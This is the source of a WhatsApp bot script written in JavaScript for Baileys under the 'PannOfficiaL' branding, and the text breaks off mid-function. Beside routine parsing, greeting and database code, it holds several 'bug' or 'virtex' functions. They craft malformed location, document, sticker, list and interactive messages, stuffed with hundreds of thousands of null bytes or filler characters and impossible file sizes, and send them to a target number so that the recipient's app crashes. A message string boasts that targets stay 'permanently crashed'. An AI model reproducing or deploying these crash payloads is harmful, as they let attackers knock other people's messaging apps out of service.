//Rafzmods999
//not sale this script

module.exports = async (PannOfficiaL, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await PannOfficiaL.decodeJid(PannOfficiaL.user.id)
const sender = m.key.fromMe ? (PannOfficiaL.user.id.split(':')[0]+'@s.whatsapp.net' || PannOfficiaL.user.id) : (m.key.participant || m.key.remoteJid)
const tescuk = ["0@s.whatsapp.net"]
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await PannOfficiaL.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./Rafz").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const thebug = fs.readFileSync(`./database/image/thebug.jpg`)
const byxz = fs.readFileSync(`./database/image/PannOfficiaL.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = '›› ༂ 𝐀͖̈́͞𝐭𝐭̚𝐚̃𝐜̢̋͢𝐤𝐢𝐧̈́𝐠༗ ༂'
const bugsuc = '『 🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 』\n\n🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐫𝐚𝐬𝐡 𝐕𝟐.𝟎\n\n  𝐍𝐎𝐓𝐄\n> Jika target masih c2 biarin aja tapi itu target tetap crash permanen'
// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			freeze
		} = require("./database/virtex/freeze.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			bugurl
		} = require('./database/virtex/bugUrl.js')
		const {
		    talapreta3
	    } = require('./database/virtex/telapreta3.js')
	    
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return PannOfficiaL.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🐦‍🔥 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       
    PannOfficiaL.autoshalat = PannOfficiaL.autoshalat ? PannOfficiaL.autoshalat : {}
    let id = m.chat
    if (id in PannOfficiaL.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        PannOfficiaL.autoshalat[id] = [
            PannOfficiaL.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat Menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": 'PannOfficiaL',
    "description": "Pntk",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://whatsapp.com/channel/0029VarGepU1dAw1U76h3S1k",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥🫀`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: '🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363325294099425@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: ''
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
"title": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥🫀`,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
},
"title": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
"description": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "777@g.us",
"inviteCode": "m",
"groupName": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
"caption": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
"h": `Hmm`,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🎭⃟𖤇𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🫀 `,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}
}
}
//REVISION\\
		async function LIVELOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "mass",
							"caption": `sv PannOfficiaL` + "\u0000".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			})
			await PannOfficiaL.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🔥፝⃟ ꙳ 𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋🔥፝⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await PannOfficiaL.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await PannOfficiaL.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://k.top4top.io/p_3241oy2j10.jpg"
							}
						}, {
							upload: PannOfficiaL.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ©𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋 !!"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await ryozingod.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		const PORKE = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/thebug.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const PORKE2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/thebug.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
//=================================================//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "sv PannOfficiaL",
    "caption": `💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await PannOfficiaL.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await PannOfficiaL.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await PannOfficiaL.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await PannOfficiaL.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://k.top4top.io/p_3241oy2j10.jpg" } }, { upload: PannOfficiaL.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #PannOfficiaLdominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await PannOfficiaL.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥"+" ".repeat(920000),
        'footerText': `💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥.xp`,
        'description': `💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await PannOfficiaL.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   PannOfficiaL.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: PannOfficiaL.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By PannOfficiaL`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await PannOfficiaL.sendPresenceUpdate('composing', jid)
      return PannOfficiaL.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
